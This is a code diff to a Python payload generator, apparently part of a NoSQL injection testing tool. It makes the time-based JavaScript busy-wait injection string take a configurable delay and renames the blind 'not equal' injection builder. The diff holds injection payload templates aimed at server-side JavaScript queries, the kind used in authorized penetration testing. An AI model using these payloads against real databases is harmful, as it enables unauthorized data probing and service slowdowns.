@@ -116,19 +116,22 @@ class InjectionStringCreator:
             central = st[1] % (injString)
             yield "%s%s%s" % (st[0],central,st[2])
 
-    def createTimeString(self):
+    def createTimeString(self,delay):
         """
         Creates a time injection string.
+        This is just an alpha version. Uses fixed 10 secs
         Right now, no random strings are needed
         """
 
         informations = [
-            'var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return;'
-                ]
+            """var date=new Date();date=date.getTime();do{curDate=new Date();}while((Math.abs(date-curDate.getTime()))/1000<%d);return;"""
+            #"""setTimeout(function(){return;},%s)"""
+            ]
         for st in itertools.product(self.leftPart, informations, self.rightPart):
-            yield "%s%s%s" % (st[0], st[1], st[2])
+            inf = st[1] %(int(delay))
+            yield "%s%s%s" % (st[0], inf, st[2])
 
-    def createBlindNeqString(self, injString):
+    def makeBlindNeqString(self, injString):
         """
         Crates a blind injection string.
         Use a random string and compare it as an element in collection with a rightPart element
@@ -139,7 +142,7 @@ class InjectionStringCreator:
             "return this.%s!='",
             "return this.%s!=\"",
         ]
-        randCentral = rand(injString(5,2))
+        randCentral = randInjString(5,2)
         for st in itertools.product(self.leftPart, informations, self.rightPart):
             central = st[1] % (randCentral)
             yield "%s%s%s%s" % (st[0], central, injString, st[2])
